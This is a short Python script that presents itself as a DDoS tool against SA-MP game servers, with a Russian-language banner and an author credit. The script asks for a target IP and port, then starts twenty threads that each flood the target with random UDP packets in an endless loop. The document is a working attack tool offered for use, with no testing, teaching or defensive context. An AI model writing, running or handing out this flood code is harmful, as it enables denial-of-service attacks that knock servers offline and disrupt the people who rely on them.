import sys
import os
import time
import socket
import random
from colorama import Fore, Back, Style
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
# Import modules
import os
import sys
import argparse
from colorama import Fore
import threading
import random
import time
import socket
import sys
import requests 
import socks
import ssl
os.system("clear")
method = "HTTP"
print("""\033[31m
      ░░░░░░░░░░▀▀▀██████▄▄▄░░░░░░░░░░
      ░░░░░░░░░░░░░░░░░▀▀▀████▄░░░░░░░
      ░░░░░░░░░░▄███████▀░░░▀███▄░░░░░
      ░░░░░░░░▄███████▀░░░░░░░▀███▄░░░
      ░░░░░░▄████████░░░░░░░░░░░███▄░░
      ░░░░░██████████▄░░░░░░░░░░░███▌░
      ░░░░░▀█████▀░▀███▄░░░░░░░░░▐███░
      ░░░░░░░▀█▀░░░░░▀███▄░░░░░░░▐███░
      ░░░░░░░░░░░░░░░░░▀███▄░░░░░███▌░
      ░░░░▄██▄░░░░░░░░░░░▀███▄░░▐███░░
      ░░▄██████▄░░░░░░░░░░░▀███▄███░░░
      ░█████▀▀████▄▄░░░░░░░░▄█████░░░░
      ░████▀░░░▀▀█████▄▄▄▄█████████▄░░
      ░░▀▀░░░░░░░░░▀▀██████▀▀░░░▀▀██░░ 
        
           \033[36mРазнеси всех и вся 💥
""")
time.sleep(2)
import random
import socket
import threading

print("")
print(""""  | BY. PH ~DHRUBO | """)

print("")
print(""" 
	| SAMP SERVER - DDOS ATTACK | 
""")
print("")
print("""
	  - MADE BY DHRUBO -
""")
print("")
ip = input(" IP : ")
port = input(" PORT : ")

def udpsirisakz():
	data = random._urandom(1200)
	thr = int(0)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			s.sendto(data,addr)
			for x in range(1):
				s.sendto(data,addr)
				thr += 1
			print(f"| SAMP SERVER - ATTACK | {ip}:{port} Time: 120 >>", thr)
		except:
			thr -= 1

for y in range(20):
		th = threading.Thread(target = udpsirisakz)
		th.start()
